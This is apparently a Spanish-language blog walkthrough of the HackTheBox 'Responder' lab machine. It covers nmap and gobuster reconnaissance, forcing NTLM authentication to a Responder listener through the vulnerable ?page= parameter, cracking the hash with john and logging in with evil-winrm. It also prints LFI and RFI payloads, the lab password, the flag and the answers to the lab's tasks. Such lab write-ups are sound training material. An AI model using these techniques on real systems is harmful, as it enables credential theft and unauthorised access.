---
title: Responder - Starting Point
author: skkkajenen
date: 2023-04-01 22:00:00 +0200
categories: [Hacking, Writeups]  # Categoría principal , categoría secundaria
tags: [htb,windows,john,password-cracking,winrm,startingpoint]     # TAG names should always be lowercase
image: /htb_responder.png   # Mantener la proporción 1.91 : 1
img_path: /posts/responder
published: false
---

# Introducción

**Responder** es la segunda máquina **Windows** de las incluidas en el **Starting Point** de [HackTheBox][htb].
Sin duda una máquina muy completa donde tocaremos cracking de contraseñas, probaremos ataques de **LFI** (Local File Inclusion) y más...

<div>
    <img src="https://img.shields.io/badge/Sistema-Windows-blue" alt="Sistema-Windows-blue" />
    <img src="https://img.shields.io/badge/Dificultad-VeryEasy-brightgreen" alt="Dificultad-VeryEasy-brightgreen" /> 
</div>

# Resolución

## Conexión al VPN de HTB

Comenzamos estableciendo conexión por VPN con la plataforma [HackTheBox][htb].
Una vez tengamos IP asignada de la VPN de HTB procedemos a ir a la web de Starting Point para iniciar la máquina **Responder**.
Puede trascurrir hasta 2 minutos en reconocer la web que estamos conectados por VPN, llegando en ocasiones a tener que refrescar la página `F5`
Nos asignan en este ejercicio la IP **10.10.15.28**

> Si tienes dudas sobre conectar con la **VPN** de [HackTheBox][htb] te lo explico [**aquí**][vpn]
{: .prompt-tip}

## Iniciar la máquina

Iniciamos la máquina pulsando sobre el botón

![Botón Spawn Machine](spawn_machine.png)

Tras unos cuantos segundos (en ocasiones puede tardar más) se habrá iniciado correctamente la máquina y nos mostrará la dirección ip de la *máquina víctima*. En nuestro caso será **10.129.230.9**

### Settarget

Haciendo uso de la herramienta previamente establecida en la ZSH llamada '*settarget*' dejaremos anotada la IP y nombre de la *máquina víctima* en la parte superior de la Polybar para tener así mayor eficacia. La sintaxis es: `settarget (IP_VICTIMA) (NOMBRE_MAQUINA_VICTIMA)`

~~~bash
settarget 10.129.230.9 Responder
~~~

De esta manera tendremos siempre bien referenciada la *máquina víctima* en la parte superior de la pantalla en la Polybar:

![settarget](settarget.png)

### Ping

Comprobamos que tengamos visibilidad con la *máquina víctima* lanzando un `ping`sobre ella. Con el parámetro `-c 1` le indicamos que tan solo haga un ping. No es necesario más.

~~~bash
ping -c 1 10.129.230.9
~~~

Como resultado obtenemos lo siguiente de lo cual destacatemos el TTL y el número de paquetes enviados / recibidos:

![Ping](ping.png)

* `TTL = 127`
: Este valor (cercano a 128) indica que nos encontramos ante una máquina **Windows**

> Por defecto valores de `TTL` en torno a ***64*** indica que la máquina es **Linux** mientras que valores de ***128*** indicaría que la máquina es **Windows**
{: .prompt-info}

* `1 packets transmitted, 1 received`
: Indica que el paquete enviado ha sido recibido con éxito por lo tanto => La *máquina víctima* está encendida y tenemos conexión con ella

## Reconocimiento con NMAP (PortDiscovery)

>[NMAP][nmap] es una herramienta ampliamente extendida en el reconocimiento de redes así como en el escaneo de puertos, hosts y servicios

Ejecutaremos la instrucción básica de reconocimiento con los parámetros que se explican a continuación:

~~~bash
nmap -p- -sS --min-rate 5000 -n -Pn -vvv --open 10.129.230.9 -oG allPorts
~~~

* `-p-`
: Indicamos que queremos analizar el rango completo de puertos. Del 1 al 65535

* `-sS`
: Especificación del tipo de escaneo. En este caso SYN Scan que es rápido a la vez que sigiloso ya que no termina de establecer la conexión y de tal manera puede pasar desapercibido en los logs de conexión

* `--min-rate 5000`
: Acelera el proceso de escane ya que no tramita paquetes cuya velocidad sea inferior a 5000 paquetes por segundo. Esto puede hacer menos sigiloso el escaneo pero más rápido

* `-n`
: Indica que *no* queremos aplicar resolución *DNS*. Más velocidad de escaneo

* `-Pn`
: Escaneo de puertos incluso si el host no responde a los ping. Ignora si el host está o no online

* `-vvv`
: *Triple verbose* para que los resultados que vaya obteniendo los vaya mostrando por pantalla sin necesidad de acabar el escaneo

* `--open`
: Un puerto principalmente puede estar **Abierto**, **Cerrado** o **Filtrado**. En un principio nos centraremos en aquellos que están **Abiertos**

* `-oG allPorts`
: Salida del resultado en un fichero llamado ***allPorts*** en formato *'grepable'* lo cual aportará ventajas a la hora de tratarlo posteriormente

El resultado del comando ejecutado sería el siguiente:

![NMAP sS](nmap_ss.png)

Hay numerosos puertos abiertos, entre ellos el **puerto 445** al que nos hacía referencia la pregunta de la mini-flag #2

* `Puerto 80 => HTTP`
: El servicio **HTTP**, acrónimo de **HyperText Transfer Protocol** es el protocolo de comunicación que permite las transferencias de información a través de archivos (XML, HTML…) en la World Wide Web. Indica que podremos conectarnos usando un navegador para ver si hay una web corriendo en este puerto

* `Puerto 5985 => WSMAN`
: Puerto que permite la ejecución remota de comandos en Windows

* `Puerto 7680 => Pando pub`
: (pdte) ------------------------------------------------------

## Puertos abiertos (versiones)

Sobre aquellos puertos abiertos en la *máquina víctima* lanzaremos un comando de NMAP enfocado al descubrimiento de versiones de los servicios que estén corriendo sobre los puertos abiertos

~~~bash
nmap -sCV -p80,p5985,p7680 10.129.230.9 -oN targeted
~~~

* `-sCV` (también se puede poner como `-sC -sV`)
: Realiza un escaneo en busca de versiones y comparando con una base de datos de servicios conocidos

* `-p(número de puertos)`
: Indica que se analizará en esta caso únicamente los puertos indicados

* `-oN targeted`
: Salida del resultado en un fichero llamado ***targeted*** en formato normal de NMAP

El resultado del comando ejecutado sería el siguiente:

![NMAP sCV](nmap_scv.png)

## Reconocimiento del Puerto 80

### Whatweb

Haciendo uso de la herramienta **whatweb** exploramos la dirección IP obteniendo el siguiente resultado:

![Reconocimiento con Whatweb](whatweb.png)

* Llama especialmente la atención un **Redirect** a la web `http://unika.htb` que al no estar contemplada en el `/etc/hosts` no resuelve el dominio.

* El servidor es un **Apache** en una versión 2.4.52 el cual consideraremos si es susceptible de ser vulnerable.

* También tiene corriendo PHP en una versión 8.1.1

### Navegador

Cuando tratamos de navegar a la dirección `http://10.129.230.9` se aplica un **redirect** a la web `http://unika.htb` que al no estar contemplada en el `/etc/hosts` no resuelve como ya indicábamos anteriormente.

#### Añadir IP al /etc/hosts

1. Abrir con privilegios el archivo /etc/hosts
   `sudo nano /etc/hosts`

2. Añadir al final una línea con la **IP** y el **dominio**. Para este caso:
   `10.129.230.9 unika.htb`

3. Guardar y Cerrar => Comprobar que ahora si muestra contenido la web

![Añadida IP al /etc/hosts](etc-hosts.png)

### Wappalyzer

Con la extensión **Wappalyzer** podemos analizar desde el navegador los servicios y plugin que corren en la web de manera similar que con **whatweb** lo hacíamos desde línea de comandos

Esta es ahora la apariencia que tiene la web:

![Web](web.png)

Y estas son las tecnologías que Wappalyzer ha reconocido:

![Wappalyzer](wappalyzer.png)

### Descubrimiento con Gobuster

Haciendo uso de la herramienta **Gobuster** podemos lanzar una exploración de la web en busca de directorios y ciertos ficheros que pueden resultar interesantes.

~~~bash
gobuster dir -u http://unika.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -r -t 50
~~~

* `dir`
: Parámetro que le indica a **Gobuster** que queremos hacer un análisis de directorios y ficheros

* `-u`
: URL sobre la que se va a aplicar el escaneo

* `-w`
: Diccionario de palabras sobre el que iterando se probarán todas las palabras

* `-x`
: Extensiones que me interesa comprobar (ej. php, js, ...)

* `-r`
: Indica que se siga el redireccionamiento en caso de que lo hubiese

* `-t`
: Número de hilos (ejecuciones en paralelo) que le indicamos que debe hacer

El resultado del análisis muestras ciertos ficheros con código de **respuesta 200 OK** que son los que a priori son más interesantes.

![Exploración con Gobuster](gobuster-200.png)

Exploramos el `/index.php` con un `curl http://unika.htb/index.php > index.php` para redireccionar la salida a un fichero y lo exploramos con **nvim** que nos permite formatear el código.

No parece reportar nada interesante.

## Responder

Haciendo honor al nombre de la máquina usaremos la herramienta homónima `responder` que ya viene preinstalada en sistemas **Parrot** o **Kali**

Aprovechando que la web permite que desde el parámetro `?page=` se pueda ejecutar cualquier cosa le haremos una petición a nuestra máquina (atacante) de cualquier recurso que no es necesario que exista.

Para ello nos pondremos a la escucha con `responder` ejecutando:

~~~bash
sudo responder -I tun0
~~~

* `-I`
: Indicamos la interfaz por la que nos ponemos a la escucha. En este caso por estar conectados a la VPN de HTB será la `tun0`

~~~bash
[+] Listening for events...
~~~

Buscamos ahora interceptar el Username y el Hash de la petición que hagamos desde la web. En nuestro caso ya que nuestra IP de atacante es la 10.10.15.28 escribiremos en la URL del navegador `http://unika.htb/?page=10.10.15.28/hola`

Al instante en nuestra terminal con **responder** a la escucha recibiremos lo que esperamos:

![Responder](responder-result.png)

## Password crack

Con el hash obtenido trataremos de obtener la contraseña en texto claro haciendo uso de la herramienta `john`.
Copiaremos el contenido íntegro del HASH a un fichero llamado `hash.txt`

~~~bash
john -w=/usr/share/wordlists/rockyou.txt hash.txt
~~~

En pocos segundos tendremos la contraseña del administrador: `badminton`

## Intrusión

Teniendo el nombre de usuario: `Administrator` y su contraseña: `badminton` exploramos otros puertos por los que acceder a servicios de la máquina Windows y conseguir vulnerarla.
Como observamos en el escaneo con NMAP tenemos en el puerto 5985 el servicio de gestión remota de Windows activo. Por ahí podremos entrar.
Para ello usaremos la herramienta `evil-winrm` y ejecutaremos:

1. `gem install evil-winrm`

2. `evil-winrm -i 10.129.230.9 -u Administrator -p badminton`

Y estamos dentro !

![Evil WINRM](evil.png)

Nos toca explorar el directorio en busca de la **flag** aunque explorando un poquito veremos que la flag.txt se encuentra en `C:\Users\mike\Desktop\flag.txt`

# Flag
![Root Flag](https://img.shields.io/badge/RootFlag-ea81b7afddd03efaa0945333ed147fac-red)

## Tasks

Si bien es recomendable ir resolviento las preguntas mientras se resuelve la máquina ya que ayuda en la resolución de la misma, en esta ocasión dejamos para el final el listado completo de preguntas o **mini-tasks** que debemos responder como parte de la resolución de la máquina:

1. When visiting the web service using the IP address, what is the domain that we are being redirected to?
: `unika.htb`

2. Which scripting language is being used on the server to generate webpages?
: `PHP`

3. What is the name of the URL parameter which is used to load different language versions of the webpage?
: `page`

4. Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"
: `../../../../../../../../windows/system32/drivers/etc/hosts`

5. Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"
: `//10.10.14.6/somefile`

6. What does NTLM stand for?
: `New Technology Lan Manager`

7. Which flag do we use in the Responder utility to specify the network interface?
: `-I`

8. There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?.
: `john the ripper`

9. What is the password for the administrator user?
: `badminton`

10. We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?
: `5985`








[htb]: https://www.hackthebox.com
[vpn]: https://www.skkkajenen.com/posts/Connect-VPN-HTB/
[nmap]: https://nmap.org